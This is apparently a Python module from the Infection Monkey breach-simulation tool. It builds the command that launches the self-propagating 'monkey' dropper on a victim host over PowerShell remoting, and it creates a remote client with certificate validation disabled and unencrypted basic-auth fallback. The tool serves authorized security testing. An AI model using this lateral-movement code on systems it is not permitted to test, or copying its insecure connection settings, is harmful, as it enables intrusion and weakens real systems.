from pypsrp.client import Client
from typing_extensions import Protocol

from infection_monkey.exploit.powershell_utils.auth_options import AuthOptions
from infection_monkey.model import DROPPER_ARG, RUN_MONKEY, VictimHost
from infection_monkey.utils.commands import build_monkey_commandline


def build_monkey_execution_command(host: VictimHost, depth: int, executable_path: str) -> str:
    monkey_params = build_monkey_commandline(
        target_host=host,
        depth=depth,
        vulnerable_port=None,
        location=executable_path,
    )

    return RUN_MONKEY % {
        "monkey_path": executable_path,
        "monkey_type": DROPPER_ARG,
        "parameters": monkey_params,
    }


AUTH_BASIC = "basic"
AUTH_NEGOTIATE = "negotiate"
ENCRYPTION_AUTO = "auto"
ENCRYPTION_NEVER = "never"

CONNECTION_TIMEOUT = 3  # Seconds


class IClient(Protocol):
    def execute_cmd(self, cmd: str):
        pass


def get_client_based_on_auth_options(auth_options: AuthOptions) -> IClient:

    # Passwordless login only works with SSL false, AUTH_BASIC and ENCRYPTION_NEVER
    if auth_options.password == "":
        ssl = False
    else:
        ssl = auth_options.is_https
    auth = AUTH_NEGOTIATE if auth_options.password != "" else AUTH_BASIC
    encryption = ENCRYPTION_AUTO if auth_options.password != "" else ENCRYPTION_NEVER

    return Client(
        auth_options.ip_addr,
        username=auth_options.username,
        password=auth_options.password,
        cert_validation=False,
        ssl=ssl,
        auth=auth,
        encryption=encryption,
        connection_timeout=CONNECTION_TIMEOUT,
    )
